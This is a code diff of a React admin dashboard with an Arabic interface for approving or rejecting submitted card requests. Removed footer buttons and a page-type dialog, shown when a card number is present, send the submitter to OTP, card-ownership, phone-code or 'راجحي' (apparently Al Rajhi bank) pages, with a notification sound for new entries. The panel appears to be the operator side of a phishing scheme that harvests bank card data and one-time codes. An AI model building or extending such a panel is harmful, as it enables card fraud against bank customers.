+            <h3 className="font-medium mb-3 text-lg text-blue-800 dark:text-blue-300 flex items-center">
+              <Shield className="h-5 w-5 mr-2" />
+              إجراءات الموافقة
+            </h3>
+            <div className="grid grid-cols-2 gap-3 mt-4">
+              <Button
+                onClick={() => {
+                  selectedCardInfo &&
+                    handleApprovalWithFirestore(
+                      "approved",
+                      selectedCardInfo.id
+                    );
+                }}
+                className="bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white border-0 shadow-md"
+              >
+                <CheckCircle className="h-4 w-4 mr-2" />
+                قبول الطلب
+              </Button>
+              <Button
+                onClick={() => {
+                  selectedCardInfo &&
+                    handleApprovalWithFirestore(
+                      "rejected",
+                      selectedCardInfo.id
+                    );
+                }}
+                className="bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700 text-white border-0 shadow-md"
+              >
+                <XCircle className="h-4 w-4 mr-2" />
+                رفض الطلب
+              </Button>
+            </div>
+            <div className="mt-3 text-sm text-gray-500 text-center">
+              {selectedCardInfo?.status === "approved" ? (
+                <div className="flex items-center justify-center gap-1.5 text-green-600">
+                  <CheckCircle className="h-4 w-4" />
+                  <span>تمت الموافقة على هذا الطلب</span>
+                </div>
+              ) : selectedCardInfo?.status === "rejected" ? (
+                <div className="flex items-center justify-center gap-1.5 text-red-600">
+                  <XCircle className="h-4 w-4" />
+                  <span>تم رفض هذا الطلب</span>
+                </div>
+              ) : (
+                <div className="flex items-center justify-center gap-1.5 text-yellow-600">
+                  <Clock className="h-4 w-4" />
+                  <span>هذا الطلب في انتظار الموافقة</span>
                 </div>
               )}
             </div>
-          )}
-
-          <DialogFooter className="grid grid-cols-4 mt-4 pt-3 border-t gap-2">
-            {selectedCardInfo?.card_number ? (
-              <>
-                {" "}
-                <Button
-                  onClick={() => {
-                    selectedCardInfo &&
-                      handleApprovalWithFirestore(
-                        "rejected",
-                        selectedCardInfo.id
-                      );
-                  }}
-                  className="w-full bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700 text-white border-0 shadow-md"
-                >
-                  رفض{" "}
-                </Button>
-                <Button
-                  onClick={() => {
-                    selectedCardInfo &&
-                      handleUpdatePagename(selectedCardInfo.id, "verify-otp");
-                    handleApprovalWithFirestore(
-                      "approved",
-                      selectedCardInfo.id
-                    );
-                  }}
-                  className="w-full bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white border-0 shadow-md"
-                >
-                  قبول
-                </Button>
-                <Button
-                  onClick={() => {
-                    selectedCardInfo &&
-                      handleUpdatePagename(selectedCardInfo.id, "verify-card");
-                    handleApprovalWithFirestore(
-                      "approved",
-                      selectedCardInfo.id
-                    );
-                  }}
-                  className="w-full bg-gradient-to-r from-yellow-500 to-yellow-600 hover:from-green-600 hover:to-yellow-700 text-white border-0 shadow-md"
-                >
-                  باس
-                </Button>
-                <Button
-                  onClick={() => {
-                    selectedCardInfo &&
-                      handleUpdatePagename(
-                        selectedCardInfo.id,
-                        "external-link"
-                      );
-                    handleApprovalWithFirestore(
-                      "approved",
-                      selectedCardInfo.id
-                    );
-                  }}
-                  className="w-full bg-gradient-to-r from-blue-500 to-red-600 hover:from-blue-600 hover:to-blue-700 text-white border-0 shadow-md"
-                >
-                  راجحي
-                </Button>
-              </>
-            ) : null}
-          </DialogFooter>
+          </div>
         </DialogContent>
       </Dialog>
-
-      <Dialog
-        open={showPagenameDialog}
-        onOpenChange={(open) => !open && setShowPagenameDialog(false)}
-      >
-        <DialogContent
-          className="bg-white dark:bg-gray-800 border-0 shadow-2xl max-w-md rounded-xl"
-          dir="rtl"
-        >
-          <DialogHeader className="border-b pb-3">
-            <DialogTitle className="text-xl font-bold bg-gradient-to-r from-primary to-primary/80 text-transparent bg-clip-text">
-              نوع الطلب
-            </DialogTitle>
-            <DialogDescription>تحديد أو تغيير نوع الطلب</DialogDescription>
-          </DialogHeader>
-
-          {selectedNotification && (
-            <div className="space-y-4 py-3">
-              <div className="p-4 rounded-lg bg-gray-50 dark:bg-gray-700">
-                <h3 className="font-medium mb-3 text-sm">النوع الحالي</h3>
-                <div className="flex justify-center">
-                  {getPageType(selectedNotification.pagename)}
-                </div>
-              </div>
-
-              <div className="p-4 rounded-lg bg-gray-50 dark:bg-gray-700">
-                <h3 className="font-medium mb-3 text-sm">اختر نوع الطلب</h3>
-                <div className="grid grid-cols-2 gap-2">
-                  <Button
-                    variant="outline"
-                    className={`flex items-center gap-2 justify-center ${
-                      selectedNotification.pagename === "payment"
-                        ? "bg-blue-50 border-blue-300 dark:bg-blue-900/30 dark:border-blue-700"
-                        : ""
-                    }`}
-                    onClick={() =>
-                      handleUpdatePagename(selectedNotification.id, "payment")
-                    }
-                  >
-                    <CreditCard className="h-4 w-4" />
-                    دفع
-                  </Button>
-                  <Button
-                    variant="outline"
-                    className={`flex items-center gap-2 justify-center ${
-                      selectedNotification.pagename === "registration"
-                        ? "bg-purple-50 border-purple-300 dark:bg-purple-900/30 dark:border-purple-700"
-                        : ""
-                    }`}
-                    onClick={() =>
-                      handleUpdatePagename(
-                        selectedNotification.id,
-                        "registration"
-                      )
-                    }
-                  >
-                    <FileText className="h-4 w-4" />
-                    تسجيل
-                  </Button>
-                  <Button
-                    variant="outline"
-                    className={`flex items-center gap-2 justify-center ${
-                      selectedNotification.pagename === "renewal"
-                        ? "bg-green-50 border-green-300 dark:bg-green-900/30 dark:border-green-700"
-                        : ""
-                    }`}
-                    onClick={() =>
-                      handleUpdatePagename(selectedNotification.id, "renewal")
-                    }
-                  >
-                    <Calendar className="h-4 w-4" />
-                    نفاذ
-                  </Button>
-                  <Button
-                    variant="outline"
-                    className={`flex items-center gap-2 justify-center ${
-                      selectedNotification.pagename === "verify-otp"
-                        ? "bg-green-50 border-green-300 dark:bg-green-900/30 dark:border-green-700"
-                        : ""
-                    }`}
-                    onClick={() =>
-                      handleUpdatePagename(
-                        selectedNotification.id,
-                        "verify-otp"
-                      )
-                    }
-                  >
-                    <Calendar className="h-4 w-4" />
-                    رمز OTP
-                  </Button>
-                  <Button
-                    variant="outline"
-                    className={`flex items-center gap-2 justify-center ${
-                      selectedNotification.pagename === "verify-otp"
-                        ? "bg-green-50 border-green-300 dark:bg-green-900/30 dark:border-green-700"
-                        : ""
-                    }`}
-                    onClick={() =>
-                      handleUpdatePagename(
-                        selectedNotification.id,
-                        "external-link"
-                      )
-                    }
-                  >
-                    <Calendar className="h-4 w-4" />
-                    راجحي
-                  </Button>
-                  <Button
-                    variant="outline"
-                    className={`flex items-center gap-2 justify-center ${
-                      selectedNotification.pagename === "verify-card-ownership"
-                        ? "bg-green-50 border-green-400 dark:bg-green-900/30 dark:border-green-700"
-                        : ""
-                    }`}
-                    onClick={() =>
-                      handleUpdatePagename(
-                        selectedNotification.id,
-                        "verify-card-ownership"
-                      )
-                    }
-                  >
-                    <Calendar className="h-4 w-4" />
-                    رمز ownership
-                  </Button>
-                  <Button
-                    variant="outline"
-                    className={`flex items-center gap-2 justify-center ${
-                      selectedNotification.pagename === "verify-phone"
-                        ? "bg-green-50 border-green-300 dark:bg-green-900/30 dark:border-green-700"
-                        : ""
-                    }`}
-                    onClick={() =>
-                      handleUpdatePagename(
-                        selectedNotification.id,
-                        "verify-phone"
-                      )
-                    }
-                  >
-                    <Calendar className="h-4 w-4" />
-                    رمز هاتف
-                  </Button>
-                  <Button
-                    variant="outline"
-                    className={`flex items-center gap-2 justify-center ${
-                      selectedNotification.pagename === "offers"
-                        ? "bg-green-50 border-green-300 dark:bg-green-900/30 dark:border-green-700"
-                        : ""
-                    }`}
-                    onClick={() =>
-                      handleUpdatePagename(selectedNotification.id, "offers")
-                    }
-                  >
-                    <Calendar className="h-4 w-4" />
-                    عروض
-                  </Button>
-                </div>
-              </div>
-            </div>
-          )}
-
-          <DialogFooter className="flex flex-col sm:flex-row gap-2 sm:gap-0 mt-4 pt-3 border-t">
-            <Button
-              onClick={() => setShowPagenameDialog(false)}
-              className="w-full"
-              variant="outline"
-            >
-              إغلاق
-            </Button>
-          </DialogFooter>
-        </DialogContent>
-      </Dialog>
-      {/* Notification Sound */}
-      <audio ref={audioRef} preload="auto">
-        <source src="/notification.mp3" type="audio/mpeg" />
-        Your browser does not support the audio element.
-      </audio>
     </div>
   );
 }
